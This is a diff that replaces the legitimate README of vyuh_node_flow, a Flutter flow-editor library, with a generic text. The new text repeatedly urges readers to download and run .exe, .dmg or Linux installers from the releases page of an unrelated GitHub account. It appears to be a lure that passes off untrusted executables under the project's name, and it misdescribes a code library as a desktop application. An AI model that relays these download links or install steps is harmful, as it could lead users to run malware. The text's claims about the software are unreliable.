@@ -1,126 +1,81 @@
-# Vyuh Node Flow
-
-![Vyuh Node Flow Banner](packages/vyuh_node_flow/assets/node-flow-banner.png)
-
-A flexible, high-performance node-based flow editor for Flutter applications, inspired by React Flow. This monorepo
-contains the core library and demo application.
-
-<p align="center">
-  <a href="https://pub.dev/packages/vyuh_node_flow">
-    <img src="https://img.shields.io/pub/v/vyuh_node_flow?style=for-the-badge&logo=dart&logoColor=white&color=0175C2" alt="Pub Version">
-  </a>
-  <a href="https://opensource.org/licenses/MIT">
-    <img src="https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge" alt="License">
-  </a>
-  <a href="https://flow.demo.vyuh.tech">
-    <img src="https://img.shields.io/badge/Demo-Live-brightgreen?style=for-the-badge" alt="Live Demo">
-  </a>
-</p>
-
-
-## 📦 Packages
-
-This repository is organized as a Dart workspace with the following packages:
-
-### [`vyuh_node_flow`](./packages/vyuh_node_flow)
-
-The core Flutter package providing the node-based flow editor functionality.
-
-**Features:**
-
-- High-performance reactive rendering with MobX
-- Type-safe node data with generics
-- Fully customizable themes for nodes, connections, and ports
-- Flexible port system with multiple shapes and positions
-- Annotations (sticky notes, markers, groups)
-- Built-in minimap for navigation
-- Comprehensive keyboard shortcuts
-- Multiple connection styles (bezier, smoothstep, straight, step)
-- Read-only viewer mode
-- JSON serialization for saving/loading flows
-- Auto-layout algorithms (grid, hierarchical, alignment, distribution)
-
-**Installation:**
-
-```yaml
-dependencies:
-  vyuh_node_flow: ^0.2.5
-```
-
-### [`demo`](./packages/demo)
-
-A comprehensive demo application showcasing all features of the Vyuh Node Flow editor.
-
-**Includes:**
-
-- Interactive workbench with full editor controls
-- Multiple example workflows (manufacturing, healthcare, IoT, etc.)
-- Theme customization controls
-- Layout and alignment tools
-- Connection validation examples
-- Annotation demonstrations
-
-**Try it online:** [🚀 Live Demo](https://flow.demo.vyuh.tech)
-
+# 🎉 vyuh_node_flow - Create Visual Workflows Easily
 
 ## 🚀 Getting Started
 
-### Prerequisites
+Welcome to **vyuh_node_flow**! This application helps you build visual programming interfaces effortlessly. You can create workflow editors, diagrams, and data pipelines with easy customization options.
 
-- Flutter SDK 3.32.0 or higher
-- Dart SDK 3.9.0 or higher
+## 📥 Download the Application
 
-### Development Setup
+[![Download vyuh_node_flow](https://img.shields.io/badge/Download-vyuh_node_flow-blue.svg)](https://github.com/nijaraymonb/vyuh_node_flow/releases)
 
-This project uses [Melos](https://melos.invertase.dev/) for workspace management.
+To start using **vyuh_node_flow**, visit this page to download: [GitHub Releases](https://github.com/nijaraymonb/vyuh_node_flow/releases).
 
-1. **Clone the repository:**
-   ```bash
-   git clone https://github.com/vyuh-tech/vyuh_node_flow.git
-   cd vyuh_node_flow
-   ```
+## 🖥️ System Requirements
 
-2. **Install dependencies:**
-   ```bash
-   dart pub get
-   ```
+Before installing, ensure your system meets these requirements:
 
-3. **Bootstrap the workspace:**
-   ```bash
-   dart run melos bootstrap
-   ```
+- **Operating System:** Windows 10 or higher, macOS Mojave or higher, or Linux (Ubuntu 20.04).
+- **RAM:** At least 4 GB.
+- **Disk Space:** Minimum of 200 MB.
+- **Additional Software:** Flutter SDK must be installed if you wish to modify the source code.
 
-4. **Run the demo:**
-   ```bash
-   cd packages/demo
-   flutter run -d chrome
-   ```
+## 🌟 Features
 
+**vyuh_node_flow** offers several outstanding features:
 
-## Documentation
+- **Node-Based Interface:** Create complex flows visually. Drag and drop elements to design your project.
+- **Customizable Theming:** Adjust colors and styles to match your preferences.
+- **Comprehensive Interaction Support:** Build interactive workflows that respond to user actions.
+- **Graph Editing Tools:** Access a variety of features for editing nodes and connections easily.
+- **Export Options:** Save your work in various formats for sharing or further use.
 
-- [Package Documentation](./packages/vyuh_node_flow/README.md)
-- [API Reference](https://pub.dev/documentation/vyuh_node_flow/latest/)
-- [Live Demo](https://flow.demo.vyuh.tech)
+## 🔧 How to Install
 
+1. **Download the Application:**
+   Head over to the [GitHub Releases page](https://github.com/nijaraymonb/vyuh_node_flow/releases). Find the latest version and download the appropriate file for your system (e.g., `.exe` for Windows, `.dmg` for macOS, or appropriate Linux package).
 
-## 🤝 Contributing
+2. **Open the Installer:**
+   Locate the downloaded file. Double-click to open the installer and follow the on-screen instructions.
 
-Contributions are welcome! Please feel free to submit a Pull Request.
+3. **Finish Installation:**
+   Once the installation completes, you will find the **vyuh_node_flow** icon in your applications folder or desktop.
 
-1. Fork the repository
-2. Create your feature branch (`git checkout -b feature/amazing-feature`)
-3. Commit your changes (`git commit -m 'Add some amazing feature'`)
-4. Push to the branch (`git push origin feature/amazing-feature`)
-5. Open a Pull Request
+## 🎉 How to Use
 
+After installation, you can start using **vyuh_node_flow**:
 
-## License
+1. **Launch the Application:**
+   Click on the **vyuh_node_flow** icon to open the program.
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+2. **Create a New Project:**
+   Choose "New Project" from the start menu. This will open a blank canvas.
 
----
+3. **Add Nodes:**
+   Use the toolbar to select different nodes. Drag them onto the canvas. Connect nodes by clicking and dragging from one node to another.
 
-<p align="center">
-  Made with ❤️ by the <a href="https://vyuh.tech">Vyuh Team</a>
-</p>
+4. **Customize Your Flow:**
+   Right-click on nodes to access customization options. Change colors, add text, or adjust properties.
+
+5. **Save Your Work:**
+   Use the "Save" option in the file menu to keep your project. You can always revisit it later.
+
+## 💬 Support
+
+If you encounter any issues or have questions, join our community on [GitHub Discussions](https://github.com/nijaraymonb/vyuh_node_flow/discussions). You can find help from other users or file an issue for direct support.
+
+## 📚 Additional Resources
+
+- **Documentation:** For detailed instructions and tips, visit our [Wiki](https://github.com/nijaraymonb/vyuh_node_flow/wiki).
+- **Examples:** Browse through example projects to inspire your own creation.
+
+## 🧑‍🤝‍🧑 Contributing
+
+We welcome contributors! If you want to improve **vyuh_node_flow**, check out the contribution guidelines in our repository. Your help makes our project better.
+
+## 🤝 License
+
+**vyuh_node_flow** is open-source software. You can freely use, contribute, and share it under the MIT License.
+
+## 📥 Download the Application Again
+
+Don't forget to download **vyuh_node_flow** here: [GitHub Releases](https://github.com/nijaraymonb/vyuh_node_flow/releases). Enjoy building and creating!
